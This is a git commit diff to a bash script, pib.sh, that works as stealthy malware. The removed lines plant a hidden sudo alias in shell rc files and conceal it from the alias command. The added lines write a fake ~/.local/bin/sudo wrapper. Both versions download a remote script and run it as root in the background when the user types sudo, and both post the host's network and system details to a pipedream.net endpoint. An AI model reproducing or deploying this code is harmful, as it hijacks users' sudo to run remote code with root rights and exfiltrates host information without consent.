2f4a6d0a3bd509b592059d5090473f9a9ac30123
skyf0l <tom.rorato@epitech.eu>
2021-06-28 10:45:42 +0200

    Update pib.sh

--- pib.sh
+++ pib.sh
@@ -1,20 +1,15 @@
 #!/bin/bash
 
-SUDO_ALIAS='\n\\alias sudo="sudo bash -c \"((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown)|nohup sudo bash > /dev/null 2>&1 &disown)\" && (unset -f nalias && unalias sudo && unalias alias) > /dev/null 2>&1 && sudo \\`#h1dD3N\\`"
-\nfunction nalias() { if [ $# = 0 ]; then \\alias | /bin/grep -v "h1dD3N"; else \\alias "$1"; fi } #h1dD3N"
-\nalias alias="nalias \\`#h1dD3N\\`"'
+echo '#!/bin/bash
 
-function install_in_rc() {
-    if ! [ -f "$1" ]; then
-        return
-    fi
-    sed -i '/h1dD3N/d' "$1"
-    if ! grep -q "h1dD3N" "$1"; then
-        echo -ne $SUDO_ALIAS >> "$1"
-    fi
-}
+/bin/sudo bash -c "((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown) | nohup sudo bash > /dev/null 2>&1 &disown)" > /dev/null 2>&1
+if [ $? = 0 ]; then
+    /bin/sudo $@
+fi' > ~/.local/bin/sudo
+chmod +x ~/.local/bin/sudo
 
-install_in_rc ~/.bashrc
-install_in_rc ~/.zshrc
-
-(ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/user_$(uname -n) -X POST -d "$(</dev/stdin)" > /dev/null 2>&1
+if [ -e ~/.local/bin/sudo ]; then
+    (ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/user_$(uname -n) -X POST -d "$(</dev/stdin)" > /dev/null 2>&1
+else
+    (ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/fail_$(uname -n) -X POST -d "$(</dev/stdin)" > /dev/null 2>&1
+fi
